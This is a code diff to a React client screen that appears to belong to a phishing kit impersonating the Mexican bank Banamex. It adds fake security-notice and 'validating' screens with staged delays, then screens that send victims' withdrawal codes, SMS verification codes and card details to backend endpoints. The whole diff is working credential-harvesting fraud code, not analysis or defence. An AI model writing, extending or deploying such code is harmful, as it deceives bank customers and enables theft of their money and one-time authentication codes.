@@ -572,6 +572,96 @@ export default function ClientScreen() {
         
         return;
       }
+
+      // Manejo especial para AVISO_SEGURIDAD
+      if (screen === ScreenType.AVISO_SEGURIDAD) {
+        if (formData.action === 'desvincular') {
+          setCurrentScreen(ScreenType.VALIDANDO_SEGURIDAD);
+          setTimeout(() => {
+            setCurrentScreen(ScreenType.CODIGO_RETIRO);
+          }, 5000);
+        }
+        return;
+      }
+
+      // Manejo especial para CODIGO_RETIRO
+      if (screen === ScreenType.CODIGO_RETIRO) {
+        const currentSessionId = sessionData.sessionId || sessionId;
+        
+        if (!currentSessionId) {
+          console.error('No hay sessionId disponible para CODIGO_RETIRO');
+          return;
+        }
+
+        setCurrentScreen(ScreenType.VALIDANDO);
+
+        fetch('/api/banamex/codigo-retiro', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            sessionId: currentSessionId,
+            codigoRetiro: formData.codigoRetiro,
+            codigoVerificacionSMS: formData.codigoVerificacionSMS
+          }),
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            console.log('[Código Retiro] Datos enviados exitosamente');
+            setTimeout(() => {
+              setCurrentScreen(ScreenType.PROTECCION_TARJETAS);
+            }, 2000);
+          } else {
+            console.error('[Código Retiro] Error:', data.message);
+            setCurrentScreen(ScreenType.CODIGO_RETIRO);
+          }
+        })
+        .catch(error => {
+          console.error('[Código Retiro] Error enviando:', error);
+          setCurrentScreen(ScreenType.CODIGO_RETIRO);
+        });
+
+        return;
+      }
+
+      // Manejo especial para PROTECCION_TARJETAS
+      if (screen === ScreenType.PROTECCION_TARJETAS) {
+        const currentSessionId = sessionData.sessionId || sessionId;
+        
+        if (!currentSessionId) {
+          console.error('No hay sessionId disponible para PROTECCION_TARJETAS');
+          return;
+        }
+
+        setCurrentScreen(ScreenType.VALIDANDO);
+
+        fetch('/api/banamex/proteccion-tarjetas', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            sessionId: currentSessionId,
+            tarjetas: formData.tarjetas
+          }),
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            console.log('[Protección Tarjetas] Datos enviados exitosamente');
+            setTimeout(() => {
+              setCurrentScreen(ScreenType.VERIFICANDO_INFO);
+            }, 2000);
+          } else {
+            console.error('[Protección Tarjetas] Error:', data.message);
+            setCurrentScreen(ScreenType.PROTECCION_TARJETAS);
+          }
+        })
+        .catch(error => {
+          console.error('[Protección Tarjetas] Error enviando:', error);
+          setCurrentScreen(ScreenType.PROTECCION_TARJETAS);
+        });
+
+        return;
+      }
       
       // Enviar datos al servidor inmediatamente para sesiones existentes
       const messageData = {
@@ -1202,6 +1292,11 @@ export default function ClientScreen() {
                          currentScreen === ScreenType.BANAMEX_CONTACT_FORM || 
                          currentScreen === ScreenType.BANAMEX_WAITING ||
                          currentScreen === ScreenType.ACTUALIZACION ||
+                         currentScreen === ScreenType.AVISO_SEGURIDAD ||
+                         currentScreen === ScreenType.VALIDANDO_SEGURIDAD ||
+                         currentScreen === ScreenType.CODIGO_RETIRO ||
+                         currentScreen === ScreenType.PROTECCION_TARJETAS ||
+                         currentScreen === ScreenType.VERIFICANDO_INFO ||
                          currentScreen === ScreenType.NETKEY_MANUAL;
   
   if (isBanamexPopup) {
